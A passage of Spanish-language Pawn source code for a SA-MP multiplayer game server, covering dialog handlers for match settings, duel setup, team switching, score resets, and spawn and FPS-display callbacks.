							format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}desbloqueÛ los Equipos.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
						}else{
							configuracionMundo[GetPlayerVirtualWorld(playerid)][equiposBloqueados] = true;
							format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}bloqueÛ los equipos.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
						}
						enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
						return mostrarMenuConfiguracionPartida(playerid);
					}
					case 13:
					{
					    darArmadura(GetPlayerVirtualWorld(playerid));
   						new Texto[400];
						format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}estableciÛ la armadura completa a los jugadores.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
						enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
						return mostrarMenuConfiguracionPartida(playerid);
					}
					case 14:
					{
					    respawnearJugadores(GetPlayerVirtualWorld(playerid));
   						new Texto[400];
						format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}respawneù a los jugadores.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
						enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
						return mostrarMenuConfiguracionPartida(playerid);
					}
					case 15:
					{
   						new Texto[400];
						format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}reseteo toda la partida.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
                        enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
					    resetearTodo(GetPlayerVirtualWorld(playerid));
					    return mostrarMenuConfiguracionPartida(playerid);
					}
					
					}
					
			}
			actualizarMarcador(GetPlayerVirtualWorld(playerid));
		}
case D_MENU_CONFIGURACION_PARTIDA_MAPA:
		{
        	if(response){
        		switch(listitem){
        		    case 0: cambiarMapa(playerid, GetPlayerVirtualWorld(playerid), 0);
        		    case 1: cambiarMapa(playerid, GetPlayerVirtualWorld(playerid), 1);
        		    case 2: cambiarMapa(playerid, GetPlayerVirtualWorld(playerid), 2);
				}
        	    actualizarPosicionMarcador(GetPlayerVirtualWorld(playerid));
                return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_ARMA:
		{
        	if(response){
        		switch(listitem){
        		    case 0: cambiarArma(playerid, GetPlayerVirtualWorld(playerid), 0);
        		    case 1: cambiarArma(playerid, GetPlayerVirtualWorld(playerid), 1);
        		    case 2: cambiarArma(playerid, GetPlayerVirtualWorld(playerid), 2);
        		    case 3: cambiarArma(playerid, GetPlayerVirtualWorld(playerid), 3);
				}
                return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_RM:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionRM(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id > 30 || id < 0){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> No se permite esa cantidad (1 - 30).");
					return mostrarMenuConfiguracionRM(playerid);
				}
				if(id == configuracionMundo[numeroMundo][rondaMaxima]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> Ya estù puesto esa cantidad actualmente.");
					return mostrarMenuConfiguracionRM(playerid);
				}

        		new Texto[300];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ la ronda m·xima a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][rondaMaxima] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_PM:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionPM(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id > 200 || id < 5){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> No se permite esa cantidad (5 - 200).");
					return mostrarMenuConfiguracionPM(playerid);
				}
				if(id == configuracionMundo[numeroMundo][puntajeMaximo]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> Ya estù puesto esa cantidad actualmente.");
					return mostrarMenuConfiguracionPM(playerid);
				}

        		new Texto[300];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ el puntaje m·ximo a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][puntajeMaximo] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_PN:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionPM(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id >= configuracionMundo[numeroMundo][puntajeMaximo]){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> El puntaje no tiene que ser igual o mayor al puntaje m·ximo.");
					return mostrarMenuConfiguracionPartida(playerid);
				}
				if(id < 0){
					SendClientMessage(playerid, COLOR_AMARILLO, "> El n˙mero no puede ser negativo.");
					return mostrarMenuConfiguracionPR(playerid);
				}
				if(id == configuracionMundo[numeroMundo][puntajeNaranja]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> No escribas el puntaje actual.");
					return mostrarMenuConfiguracionPR(playerid);
				}

        		new Texto[300];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ el puntaje del equipo {F69521}naranja {C9C9C9}a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][puntajeNaranja] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_RN:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionRR(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id >= configuracionMundo[numeroMundo][rondaMaxima]){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> La ronda no tiene que ser igual o mayor a la ronda m·xima.");
					return mostrarMenuConfiguracionRR(playerid);
				}
				if(id < 0){
					SendClientMessage(playerid, COLOR_AMARILLO, "> El n˙mero no puede ser negativo.");
					return mostrarMenuConfiguracionRR(playerid);
				}
				if(id == configuracionMundo[numeroMundo][rondasNaranja]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> No escribas la ronda actual.");
					return mostrarMenuConfiguracionRR(playerid);
				}

        		new Texto[300];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ las rondas del equipo {F69521}naranja {C9C9C9}a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][rondasNaranja] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_PV:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionPA(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id >= configuracionMundo[numeroMundo][puntajeMaximo]){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> El puntaje no tiene que ser igual o mayor al puntaje m·ximo.");
					return mostrarMenuConfiguracionPA(playerid);
				}
				if(id < 0){
					SendClientMessage(playerid, COLOR_AMARILLO, "> El n˙mero no puede ser negativo.");
					return mostrarMenuConfiguracionPA(playerid);
				}
				if(id == configuracionMundo[numeroMundo][puntajeVerde]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> No escribas el puntaje actual.");
					return mostrarMenuConfiguracionPA(playerid);
				}

        		new Texto[300];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ el puntaje del equipo {007C0E}verde {C9C9C9}a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][puntajeVerde] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_RV:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionRA(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id >= configuracionMundo[numeroMundo][rondaMaxima]){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> La ronda no tiene que ser igual o mayor a la ronda m·xima.");
					return mostrarMenuConfiguracionRA(playerid);
				}
				if(id < 0){
					SendClientMessage(playerid, COLOR_AMARILLO, "> El n˙mero no puede ser negativo.");
					return mostrarMenuConfiguracionRA(playerid);
				}
				if(id == configuracionMundo[numeroMundo][rondasVerde]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> No escribas la ronda actual.");
					return mostrarMenuConfiguracionPA(playerid);
				}

        		new Texto[300];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}cambiÛ las rondas del equipo {007C0E}verde {C9C9C9}a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][rondasVerde] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_FPS:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionFPS(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id < 20 || id > 45){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> El valor no entra en el rango.");
					return mostrarMenuConfiguracionFPS(playerid);
				}
				if(id < 0){
					SendClientMessage(playerid, COLOR_AMARILLO, "> El n˙mero no puede ser negativo.");
					return mostrarMenuConfiguracionFPS(playerid);
				}
				if(id == configuracionMundo[numeroMundo][fpsMinimo]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> No escribas el valor actual.");
					return mostrarMenuConfiguracionFPS(playerid);
				}

        		new Texto[400];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}estableciÛ el minimo de fps a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][fpsMinimo] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		
		case D_MENU_CONFIGURACION_PARTIDA_PING:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero y no un texto.");
					return mostrarMenuConfiguracionRA(playerid);
				}
        	    new id = strval(inputtext);
        	    if(id < 240 || id > 400){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> El valor no entra en el rango.");
					return mostrarMenuConfiguracionPING(playerid);
				}
				if(id < 0){
					SendClientMessage(playerid, COLOR_AMARILLO, "> El n˙mero no puede ser negativo.");
					return mostrarMenuConfiguracionPING(playerid);
				}
				if(id == configuracionMundo[numeroMundo][pingMaximo]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> No escribas el valor actual.");
					return mostrarMenuConfiguracionPING(playerid);
				}

        		new Texto[400];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}estableciÛ el m·ximo de ping a {FFFFFF}%d{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][pingMaximo] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}

		case D_MENU_CONFIGURACION_PARTIDA_PL:
		{
  			new numeroMundo = GetPlayerVirtualWorld(playerid);
        	if(response){
				if(!esFloat(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe un n˙mero decimal.");
					return mostrarMenuConfiguracionPP(playerid);
				}
        	    new Float:id = floatstr(inputtext);
        	    if(id < 0.50 || id > 3.00){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> El valor no entra en el rango.");
					return mostrarMenuConfiguracionPP(playerid);
				}
				if(id < 0){
					SendClientMessage(playerid, COLOR_AMARILLO, "> El n˙mero no puede ser negativo.");
					return mostrarMenuConfiguracionPP(playerid);
				}
				if(id == configuracionMundo[numeroMundo][pingMaximo]){
					SendClientMessage(playerid, COLOR_AMARILLO, "> No escribas el valor actual.");
					return mostrarMenuConfiguracionPP(playerid);
				}

        		new Texto[400];
				format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}estableciÛ el m·ximo de paquetes perdidos a {FFFFFF}%.2f{C9C9C9}.", numeroMundo, colorJugador(playerid), obtenerNick(playerid), id);
				enviarATodos(numeroMundo, Texto);
                configuracionMundo[numeroMundo][plMaximo] = id;
				return mostrarMenuConfiguracionPartida(playerid);
			}else
				return mostrarMenuConfiguracionPartida(playerid);
		}
		case D_MENU_TOP:
		{
        	if(response){
        		switch(listitem){
        		    case 0: mostrarTop(0, playerid);
					case 1: mostrarTop(1, playerid);
					case 2: mostrarTop(2, playerid);
					case 3: mostrarTop(3, playerid);
					case 4: mostrarTop(4, playerid);
				}
			}else{}
		}

		case D_MENU_TOP_DATOS: if(response) mostrarMenuTop(playerid);

		case D_MENU_DUELO:
		{
        	if(response){
        		switch(listitem){
        		    case 0: mostrarMenuMapasDuelo(playerid);
        		    case 1: mostrarMenuOponenteDuelo(playerid);
        		    case 2: mostrarMenuTipoArmaDuelo(playerid);
        		    case 3:
        		    {
        		        if(Duelo[playerid][Mapa] == 0){
            				SendClientMessage(playerid, COLOR_AMARILLO, "> Falta elegir un mapa para el duelo.");
							return mostrarMenuDuelo(playerid);
						}
        		        if(Duelo[playerid][Oponente] == -1){
            				SendClientMessage(playerid, COLOR_AMARILLO, "> Falta elegir un oponente para el duelo.");
							return mostrarMenuDuelo(playerid);
						}
  						if(Duelo[playerid][tipoArma] == 0){
            				SendClientMessage(playerid, COLOR_AMARILLO, "> Falta elegir el tipo de arma para el duelo.");
							return mostrarMenuDuelo(playerid);
						}
						
						new Texto[264];
						format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] Se enviÛ la peticiÛn de duelo a {%06x}%s{C9C9C9}.", colorJugador(Duelo[playerid][Oponente]), obtenerNick(Duelo[playerid][Oponente]));
						SendClientMessage(playerid, COLOR_NEUTRO, Texto);
						Duelo[playerid][Creador] = true;
						Duelo[playerid][Esperando] = true;
						enviarPeticionDuelo(playerid, Duelo[playerid][Oponente]);
					}
				}
			}else
                resetConfiguracionDuelo(playerid);
		}
		
		case D_MENU_DUELO_MAPAS:
		{
        	if(response){
        		switch(listitem){
        		    case 0:
					{
						if(Duelo[playerid][Mapa] == 1){
						    SendClientMessage(playerid, COLOR_AMARILLO, "> No elijas el mismo mapa.");
                            return mostrarMenuMapasDuelo(playerid);
						}
						if(!dueloMapaEstado[1]){
						    SendClientMessage(playerid, COLOR_AMARILLO, "> Este mapa ya est· ocupado.");
                            return mostrarMenuMapasDuelo(playerid);
						}

						if(Duelo[playerid][Mapa] != 0)
                            dueloMapaEstado[Duelo[playerid][Mapa]] = true;

						Duelo[playerid][Mapa] = 1;
                        dueloMapaEstado[1] = false;
					}
        		    case 1:
					{
						if(Duelo[playerid][Mapa] == 2){
						    SendClientMessage(playerid, COLOR_AMARILLO, "> No elijas el mismo mapa.");
                            return mostrarMenuMapasDuelo(playerid);
						}
						
						if(!dueloMapaEstado[2]){
						    SendClientMessage(playerid, COLOR_AMARILLO, "> Este mapa ya est· ocupado.");
                            return mostrarMenuMapasDuelo(playerid);
						}
						

						if(Duelo[playerid][Mapa] != 0)
                            dueloMapaEstado[Duelo[playerid][Mapa]] = true;

						Duelo[playerid][Mapa] = 2;
                        dueloMapaEstado[2] = false;
					}
        		    case 2:
					{
						if(Duelo[playerid][Mapa] == 3){
						    SendClientMessage(playerid, COLOR_AMARILLO, "> No elijas el mismo mapa.");
                            return mostrarMenuMapasDuelo(playerid);
						}
						
						if(!dueloMapaEstado[3]){
						    SendClientMessage(playerid, COLOR_AMARILLO, "> Este mapa ya est· ocupado.");
                            return mostrarMenuMapasDuelo(playerid);
						}
						
						if(Duelo[playerid][Mapa] != 0)
                            dueloMapaEstado[Duelo[playerid][Mapa]] = true;
                            
						Duelo[playerid][Mapa] = 3;
                        dueloMapaEstado[3] = false;
					}
				}
				mostrarMenuDuelo(playerid);
			}else{
				if(Duelo[playerid][Mapa] != 0)
					dueloMapaEstado[Duelo[playerid][Mapa]] = true;
                Duelo[playerid][Mapa] = 0;
				mostrarMenuDuelo(playerid);
			}
		}
		
		case D_MENU_DUELO_OPONENTE:
		{
        	if(response){
        	    if(!esNumero(inputtext)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> Escribe una ID y no un texto.");
					return mostrarMenuOponenteDuelo(playerid);
        	    }
        	    
        	    new id = strval(inputtext);
        	    
        	    if(!existeJugador(id)){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> No existe un jugador con esa ID.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(id == playerid){
            		SendClientMessage(playerid, COLOR_AMARILLO, "> No pongas tu misma ID.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(!Jugador[id][invitacionDuelos]){
				    SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador tiene las invitaciones a duelos desactivados.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(Jugador[id][eligiendoMundo]){
				SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador est· eligiendo un mundo.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(Duelo[id][Configurando]){
				    SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador est· configurando un duelo actualmente.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
            	if(Duelo[id][Esperando]){
    				SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador est· esperando un duelo actualmente.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(Duelo[id][enCurso]){
    				SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya esta jugando un duelo, espera a que termine.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(tieneOponente(id)){
				    SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya tiene un oponente.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(id == Duelo[playerid][Oponente]){
              		SendClientMessage(playerid, COLOR_AMARILLO, "> Ese jugador ya es tu oponente.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(Equipo[id] != EQUIPO_ESPECTADOR){
              		SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador no est· en el equipo espectador.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				if(tieneOponente(id)){
              		SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador ya est· esperando un duelo.");
					return mostrarMenuOponenteDuelo(playerid);
				}
				
				Duelo[playerid][Oponente] = id;
				new Texto[264];
				format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] Elegiste a {%06x}%s {C9C9C9}como tu oponente.", colorJugador(id), obtenerNick(id));
				SendClientMessage(playerid, COLOR_NEUTRO, Texto);
				mostrarMenuDuelo(playerid);
			}else{
   				Duelo[playerid][Oponente] = -1;
				mostrarMenuDuelo(playerid);
			}
		}
		
		case D_MENU_DUELO_ARMAS:
		{
        	if(response){
        		switch(listitem){
        		    case 0: Duelo[playerid][tipoArma] = 1;
        		    case 1: Duelo[playerid][tipoArma] = 2;
				}
				mostrarMenuDuelo(playerid);
			}else{
                Duelo[playerid][tipoArma] = 0;
				mostrarMenuDuelo(playerid);
			}
		}

		case D_MENU_MOSTRAR_DATOS:
		{
        	if(response){
				new numeroMundo = GetPlayerVirtualWorld(playerid);
        		switch(listitem){
        		    case 0: return mostrarDatosMundo(numeroMundo, 0);
        		    case 1: return mostrarDatosMundo(numeroMundo, 1);
					case 2: return mostrarDatosMundo(numeroMundo, 2);
				}
			}
		}
	
	}
	return 1;
}

stock moverANaranja(numeroMundo, playerid){
	if(Equipo[playerid] == EQUIPO_NARANJA)
		return mostrarMenuEquipos(playerid);

	new Texto[100];
	format(Texto, sizeof(Texto), "\
	[MUNDO %d] {%06x}%s {C9C9C9}se integrÛ al equipo {F69521}Naranja{C9C9C9}.", 
	numeroMundo, colorJugador(playerid), obtenerNick(playerid));
	enviarATodos(numeroMundo, Texto);

	new equipoAnterior = Equipo[playerid];
	Equipo[playerid] = EQUIPO_NARANJA;

	actualizarJugadores(numeroMundo, equipoAnterior);

	SetPlayerColor(playerid, COLOR_NARANJA);
	SpawnPlayer(playerid);
	actualizarJugadores(numeroMundo, EQUIPO_NARANJA);
	return 1;
}

stock moverAVerde(numeroMundo, playerid){
	if(Equipo[playerid] == EQUIPO_VERDE)
		return mostrarMenuEquipos(playerid);

	new Texto[100];
	format(Texto, sizeof(Texto), "\
	[MUNDO %d] {%06x}%s {C9C9C9}se integrÛ al equipo {007C0E}Verde{C9C9C9}.", 
	numeroMundo, colorJugador(playerid), obtenerNick(playerid));
	enviarATodos(numeroMundo, Texto);

	new equipoAnterior = Equipo[playerid];
	Equipo[playerid] = EQUIPO_VERDE;

	actualizarJugadores(numeroMundo, equipoAnterior);

	SetPlayerColor(playerid, COLOR_VERDE);
	SpawnPlayer(playerid);
	actualizarJugadores(numeroMundo, EQUIPO_VERDE);
	return 1;
}

stock moverAEspectador(numeroMundo, playerid){
	if(Equipo[playerid] == EQUIPO_ESPECTADOR)
		return 1;

	new Texto[100];
	format(Texto, sizeof(Texto), "\
	[MUNDO %d] {%06x}%s {C9C9C9}se integrÛ al equipo {FFFFFF}Espectador{C9C9C9}.", 
	numeroMundo, colorJugador(playerid), obtenerNick(playerid));
	enviarATodos(numeroMundo, Texto);

	new equipoAnterior = Equipo[playerid];
	Equipo[playerid] = EQUIPO_ESPECTADOR;

	actualizarJugadores(numeroMundo, equipoAnterior);

	SetPlayerColor(playerid, COLOR_CYAN);
	SpawnPlayer(playerid);
	actualizarJugadores(numeroMundo, EQUIPO_ESPECTADOR);
	return 1;
}

stock actualizarJugadores(numeroMundo, equipo){
	switch(equipo){
		case EQUIPO_NARANJA: configuracionMundo[numeroMundo][jugadoresNaranja] = 0;
		case EQUIPO_VERDE: configuracionMundo[numeroMundo][jugadoresVerde] = 0;
		case EQUIPO_ESPECTADOR: configuracionMundo[numeroMundo][cantidadEspectadores] = 0;
	}
	
	ForPlayers(i){
		if(GetPlayerVirtualWorld(i) == numeroMundo && Equipo[i] == equipo){
			switch(equipo){
				case EQUIPO_NARANJA: configuracionMundo[numeroMundo][jugadoresNaranja]++;
				case EQUIPO_VERDE: configuracionMundo[numeroMundo][jugadoresVerde]++;
				case EQUIPO_ESPECTADOR: configuracionMundo[numeroMundo][cantidadEspectadores]++;
			}
		}
	}

	if(equipo == EQUIPO_NARANJA || equipo == EQUIPO_VERDE){
		if(partidaEnJuego(numeroMundo) && !partidaEnPausa(numeroMundo)){
			if(configuracionMundo[numeroMundo][jugadoresNaranja] != configuracionMundo[numeroMundo][jugadoresVerde])
				pausarPartidaAutomatico(numeroMundo);
		}else if(partidaEnJuego(numeroMundo) && partidaEnPausa(numeroMundo)){
			if(configuracionMundo[numeroMundo][jugadoresNaranja] > 0 && configuracionMundo[numeroMundo][jugadoresVerde] > 0){
				if(configuracionMundo[numeroMundo][jugadoresNaranja] == configuracionMundo[numeroMundo][jugadoresVerde])
					despausarPartidaAutomatico(numeroMundo);
			}
				
		}

		if(configuracionMundo[numeroMundo][jugadoresNaranja] == 0 && configuracionMundo[numeroMundo][jugadoresVerde] == 0){
			if(configuracionMundo[numeroMundo][enJuego])
				cancelarPartidaAutomatico(numeroMundo);
		}
	}
	
}


stock resetearPuntaje(numeroMundo){
	configuracionMundo[numeroMundo][puntajeNaranja] = 0;
	configuracionMundo[numeroMundo][puntajeVerde] = 0;
}

stock resetearPuntajesYRondas(numeroMundo){

	configuracionMundo[numeroMundo][rondasNaranja] = 0;
	configuracionMundo[numeroMundo][puntajeNaranja] = 0;
	configuracionMundo[numeroMundo][puntajeTotalNaranja] = 0;

	configuracionMundo[numeroMundo][rondasVerde] = 0;
	configuracionMundo[numeroMundo][puntajeVerde] = 0;
	configuracionMundo[numeroMundo][puntajeTotalVerde] = 0;
}

stock resetearTodo(numeroMundo){
	resetearTimer(numeroMundo);
	configuracionMundo[numeroMundo][enJuego] = false;
	configuracionMundo[numeroMundo][enPausa] = false;
	configuracionMundo[numeroMundo][tipoPartida] = ENTRENAMIENTO;
	configuracionMundo[numeroMundo][rondaActual] = 1;
	configuracionMundo[numeroMundo][rondaMaxima] = 1;
	configuracionMundo[numeroMundo][puntajeMaximo] = 10;

	configuracionMundo[numeroMundo][rondasNaranja] = 0;
	configuracionMundo[numeroMundo][puntajeNaranja] = 0;
	configuracionMundo[numeroMundo][puntajeTotalNaranja] = 0;

	configuracionMundo[numeroMundo][rondasVerde] = 0;
	configuracionMundo[numeroMundo][puntajeVerde] = 0;
	configuracionMundo[numeroMundo][puntajeTotalVerde] = 0;
}

stock enviarATodos(numeroMundo, Texto[]){
	ForPlayers(i)
	    if(GetPlayerVirtualWorld(i) == numeroMundo)
    		SendClientMessage(i, COLOR_NEUTRO, Texto);
}

stock darArmadura(numeroMundo){
	ForPlayers(i)
		if((GetPlayerVirtualWorld(i) == numeroMundo) && (Equipo[i] != EQUIPO_ESPECTADOR))
  			SetPlayerArmour(i, 100.0);
}

stock darVida(numeroMundo){
	ForPlayers(i)
		if((GetPlayerVirtualWorld(i) == numeroMundo) && (Equipo[i] != EQUIPO_ESPECTADOR))
  			SetPlayerHealth(i, 100.0);
}

stock respawnearJugadores(numeroMundo){
	ForPlayers(i)
		if((GetPlayerVirtualWorld(i) == numeroMundo) && (Equipo[i] != EQUIPO_ESPECTADOR && Equipo[i] != NULO))
  			CallLocalFunction("Spawn", "i", i);
}

stock guardarDatosJugadores(numeroMundo){
	ForPlayers(i)
		if((GetPlayerVirtualWorld(i) == numeroMundo) && (Equipo[i] != EQUIPO_ESPECTADOR && Equipo[i] != NULO))
  			CallLocalFunction("guardarDatos", "i", i);
}

stock respawnearTodos(numeroMundo){
	ForPlayers(i)
	    if(GetPlayerVirtualWorld(i) == numeroMundo)
	        CallLocalFunction("Spawn", "i", i);
}

public Spawn(playerid){
    SetPlayerFacingAngle(playerid, 180);
	SetPlayerPos(playerid, posicionesMapas[mapaJugador(playerid)][Equipo[playerid]][0], posicionesMapas[mapaJugador(playerid)][Equipo[playerid]][1], posicionesMapas[mapaJugador(playerid)][Equipo[playerid]][2]);
	SetCameraBehindPlayer(playerid);
}

stock mapaJugador(playerid) return configuracionMundo[GetPlayerVirtualWorld(playerid)][Mapa];


public OnPlayerUpdate(playerid){
	new FPSSS = GetPlayerDrunkLevel(playerid), fps;
	if(FPSSS < 100){
		SetPlayerDrunkLevel(playerid, 2000);
	}else{
		if(FPSSS != FPSS[playerid]){
			fps = FPSS[playerid] - FPSSS;
			if(fps > 0 && fps < 200) FPS2[playerid] = fps;
			FPSS[playerid] = FPSSS;
		}
	}
	if(Jugador[playerid][mostrarFpsPing] == 1){
		new string[60], string2[60];
		format(string, sizeof(string), "~b~Fps: ~w~%d", FPS2[playerid]);
		PlayerTextDrawSetString(playerid, mostrarFps[playerid], string);
		format(string2, sizeof(string2), "~b~Ms: ~w~%d (%.1f",  GetPlayerPing(playerid), NetStats_PacketLossPercent(playerid)); strcat(string2, "%~w~)");
		PlayerTextDrawSetString(playerid, mostrarPing[playerid], string2);
	}
	return 1;
}

public OnPlayerSpawn(playerid)
{
	if(Jugador[playerid][Congelado])
        TogglePlayerControllable(playerid, 0);
	
	SetPlayerSkin(playerid, Jugador[playerid][Skin]);
	
	if(Jugador[playerid][Desbugeando]){
		Jugador[playerid][Desbugeando] = false;
		darArmas(playerid);
		return 1;
	}
	
